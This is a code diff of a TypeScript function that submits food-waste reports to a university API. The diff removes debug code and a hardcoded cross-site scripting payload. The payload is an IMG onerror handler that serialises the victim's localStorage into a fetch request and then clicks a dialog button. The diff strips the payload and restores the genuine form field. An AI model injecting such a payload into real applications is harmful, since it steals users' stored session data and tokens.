@@ -20,20 +20,12 @@ const respostaFoiErroDeAutenticacao = (resposta: unknown): resposta is ErroDeAut
 export async function criarRelatorioDeDesperdicio(formData: FormData) {
     const API_URL = "https://ruapi.cedro.ifce.edu.br/api/report/add-waste-report"
 
-    console.log(formData.get('content'));
-    if (formData.get('content') == undefined || formData.get('date') == undefined) return { sucesso: false, mensagem: "Preencha todos os campos." };
-
-    return { sucesso: true, mensagem: "Relatório de desperdício criado com sucesso." };
-
     try {
         const resposta = await fetch(API_URL, {
             method: 'PUT',
             body: JSON.stringify({
                 date: formData.get('date'),
-                content: `<IMG SRC=javascript:alert(String.fromCharCode(88,83,83)) 
-    onERROR=fetch('/'+JSON.stringify(localStorage),&#123headers:&#123'content-type':'application/json','bypass-tunnel-reminder':'true'&#125&#125).finally(document.querySelector("body&#32&#62&#32div.App1-MuiDialog-root&#32&#62&#32div.App1-MuiDialog-container.App1-MuiDialog-scrollPaper&#32&#62&#32div&#32&#62&#32div.App1-MuiDialogActions-root.App1-MuiDialogActions-spacing&#32&#62&#32button").click())
->
-`
+                content: formData.get('content'),
             }),
             headers: {
                 'Authorization': `Bearer ${cookies().get("authorization")?.value}`,
